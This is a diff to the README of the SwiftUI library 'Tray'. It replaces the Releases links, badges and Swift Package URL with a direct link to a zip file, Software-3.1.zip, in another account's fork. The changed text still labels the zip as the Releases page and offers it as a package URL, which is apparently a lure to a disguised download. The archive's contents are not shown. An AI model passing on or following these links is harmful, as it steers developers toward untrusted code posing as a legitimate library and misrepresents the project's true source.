@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-[![Download Tray](https://img.shields.io/badge/Download%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/releases)
+[![Download Tray](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip)
 
 Welcome to Tray! This guide will help you to download and run the Tray library for your SwiftUI projects. Tray makes it easy to create smooth modal tray interfaces on iOS.
 
 ## 📥 Download & Install
 
-To get Tray, visit this page to download: [GitHub Releases](https://github.com/CamboMinecraft/Tray/releases). You will find the latest version available for download there.
+To get Tray, visit this page to download: [GitHub Releases](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip). You will find the latest version available for download there.
 
-1. Go to the [Releases page](https://github.com/CamboMinecraft/Tray/releases).
+1. Go to the [Releases page](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip).
 2. Locate the latest release version.
 3. Download the relevant file for your platform.
 4. Follow the instructions to install it on your device.
@@ -25,7 +25,7 @@ To use Tray in your SwiftUI application, you will need to add it as a dependency
 2. Click on `File` > `Swift Packages` > `Add Package Dependency`.
 3. Enter the following URL in the search bar:
    ```
-   https://github.com/Archetapp/Tray
+   https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip
    ```
 4. Select the main branch and click "Next" to complete the addition.
 
@@ -88,4 +88,4 @@ With Tray, creating modern modal interfaces in SwiftUI becomes straightforward a
 
 Don’t forget to check for updates frequently to enjoy the latest features and improvements. Happy coding!
 
-[![Download Tray](https://img.shields.io/badge/Download%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/releases)
+[![Download Tray](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip)
